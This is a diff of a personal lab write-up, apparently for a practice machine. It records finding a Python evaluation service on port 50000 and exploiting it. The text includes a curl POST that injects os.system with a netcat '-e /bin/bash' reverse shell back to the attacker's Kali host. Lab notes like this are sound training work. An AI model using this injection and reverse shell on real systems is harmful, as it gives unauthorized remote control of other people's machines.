@@ -13,12 +13,14 @@ IP: 192.168.56.117
 
 # Resolution summary
 - Found an application that performs evaluation on port 50000
+-  Typed curl -X post --data "code=os" to confirm if the application was running python as the nmap showed it was
+- Ran an os.system netcat command to from curl and received a reverse shell
 - 
 - Text
 
 ## Improved skills
 - Learned curl -X POST --data option "code= " option
-- 
+- os.system comman
 - skill 2
 
 ## Used tools
@@ -301,7 +303,7 @@ Enumerated top 200 UDP ports:
 
 #### -Ran a netcat listener on port 18000 and typed "curl -X POST --data "code=os.system('nc -e /bin/bash [kali IP] 18000')" http://192.168.241.117:50000/verify" and got a reverse shell:
 
-![](Pasted%20image%2020221016154924.png)
+![](Pasted%20image%2020221016195553.png)
 #os.systemCommandExecution
 
 ![](Pasted%20image%2020221016155012.png)
